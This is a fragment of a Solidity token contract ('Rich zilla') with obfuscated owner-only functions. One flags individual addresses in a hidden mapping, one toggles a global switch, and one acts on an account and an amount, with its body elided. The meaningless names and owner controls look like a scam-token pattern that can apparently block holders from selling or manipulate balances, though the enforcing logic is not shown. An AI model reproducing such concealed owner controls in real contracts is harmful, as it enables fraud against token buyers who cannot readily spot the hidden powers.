...
contract Crazy is Context, IERC20, Ownable {
    ...
    string private _name = "Rich zilla";
    string private _symbol = "Rich zilla";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress;
    address payable private teamWalletAddress;
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    bool public hmzkg = true;
    mapping (address => bool) public hmsz;
    ...
    function mjsawt(address account, uint256 amount) onlyOwner() public {
    ...
    function hmzkghs(bool _status) public onlyOwner {
        hmzkg = _status;
    }

    function gsni(address addre, bool status) public onlyOwner {
        hmsz[addre]  = status;
    }
